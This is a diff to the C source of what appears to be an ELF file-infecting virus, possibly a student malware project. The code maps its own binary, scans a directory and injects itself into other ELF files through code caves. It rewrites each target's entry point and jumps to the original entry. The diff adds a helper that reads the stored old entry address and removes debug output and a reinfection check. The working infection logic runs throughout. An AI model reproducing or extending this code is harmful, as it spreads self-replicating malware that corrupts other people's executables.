@@ -69,6 +69,7 @@ __attribute__((always_inline)) inline uint64_t copy_entries_into_code_caves(vola
 __attribute__((always_inline)) inline uint64_t offset_to_addr(volatile file *file, volatile uint64_t offset);
 __attribute__((always_inline)) inline int file_write(int fd, volatile file *file);
 __attribute__((always_inline)) inline void print_number_hex(uint64_t num);
+__attribute__((always_inline)) inline uint64_t old_entry_get(volatile file *file);
 
 // Helpers
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
@@ -99,7 +100,6 @@ _start() {
     infect_test[11] = 'e';
     infect_test[12] = 'd';
     infect_test[13] = '\0';
-    ft_write(1, infect_test, ft_strlen(infect_test));
     int fd_in = ft_open(infect_test, O_RDONLY, 0);
     if (fd_in < 0) infected = 1;
 
@@ -121,20 +121,34 @@ _start() {
     path_self[12] = 'x';
     path_self[13] = 'e';
     path_self[14] = '\0';
-    ft_write(1, path_self, ft_strlen(path_self));
     int fd_self = ft_open(path_self, O_RDONLY, 0);
     if (fd_self < 0) ft_exit(1);
 
     volatile file file_self;
     if (file_mmap(fd_self, &file_self)) ft_exit(1);
 
+    uint64_t old_entry = old_entry_get(&file_self);
+    char nl = '\n';
+    print_number_hex(9);
+    ft_write(1, &nl, 1);
+    print_number_hex(old_entry);
+    ft_write(1, &nl, 1);
+    print_number_hex(9);
+    ft_write(1, &nl, 1);
     // Elf64_Ehdr *header = file_self.mem;
     // if (header->e_phnum != 2) infected = 1;
 
-    __attribute__((section(".text"))) volatile static char dir0[] = "./a";
+    // __attribute__((section(".text"))) volatile static char dir0[] = "./a";
+    volatile char dir0[4];
+    dir0[0] = '.';
+    dir0[1] = '/';
+    dir0[2] = 'a';
+    dir0[3] = 0;
+
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
-    ft_exit(112);
+    void (*func_ptr)() = (void (*)())0x40a560;
+    func_ptr();
 }
 
 __attribute__((always_inline)) inline int
@@ -171,7 +185,6 @@ infect_dir(volatile char *dir_path, volatile file *file_self) {
 
 __attribute__((always_inline)) inline int
 infect_file(volatile char *path, volatile file *file_self) {
-    if (infected) ft_exit(55);
     int fd_target = ft_open(path, O_RDWR, 0);
     if (fd_target < 0) return (1);
 
@@ -257,7 +270,7 @@ infect_file(volatile char *path, volatile file *file_self) {
     *target_scaffold_num = scaffold_target_size;
 
     header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);
-    // TODO: check if all stuff is put into the correct places
+    //  TODO: check if all stuff is put into the correct places
     if (file_write(fd_target, &file_target)) ft_exit(44);
     char index = 'i';
     for (int i = 0; i < scaffold_target_size; i++) {
@@ -415,6 +428,20 @@ copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *ent
             if (entry_self_index >= entries_self_num) return cave_index + 1;
         }
     }
+    return 0;
+}
+
+__attribute__((always_inline)) inline uint64_t
+old_entry_get(volatile file *file) {
+    Elf64_Ehdr *header = file->mem;
+
+    uint64_t builder_start_offset = addr_to_offset(file, header->e_entry);
+    uint64_t builder_size = 0xdf;
+
+    uint64_t old_entry_offset = builder_start_offset + builder_size - 24;
+
+    uint64_t *old_entry = file->mem + old_entry_offset;
+    return (*old_entry);
 }
 
 __attribute__((always_inline)) inline uint64_t
